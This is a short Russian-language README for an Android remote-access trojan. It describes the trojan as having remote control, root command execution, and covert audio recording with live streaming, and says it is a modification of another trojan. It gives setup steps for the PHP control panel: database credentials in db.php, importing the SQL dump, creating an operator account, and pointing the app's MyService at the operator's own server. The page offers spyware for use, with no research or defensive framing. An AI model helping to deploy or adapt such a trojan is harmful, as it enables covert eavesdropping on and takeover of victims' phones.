# -System-Android-RAT-Trojan 
Android Trojan (встроенный с Android SDK 21) исходный код

Android-троян с возможностью дистанционного управления, выполнения корневых команд, записи и онлайн-потоковой передачи звука

Это модификация трояна( https://github.com/androidtrojan1/android-trojan-service- ) :)   
php7  
Выполнить для работы:   
1.В файле db.php нужно указать свою базу данных логин и пароль, пример (R::setup( 'mysql:host=localhost;dbname=Название Базы Данных','Логин', 'Пароль' );  
Так же для корректной работы, убедитесь что ваша база данных подходит для работы, в папке www есть дамп базы данных SQL FILE.sql \n
2.При первом запуске для авторизации нужно создать пользователя на странице singup.php после можно авторизоваться на главной странице  

В коде приложения ссылка на сайт находится в app/MyService(изменить на свой)
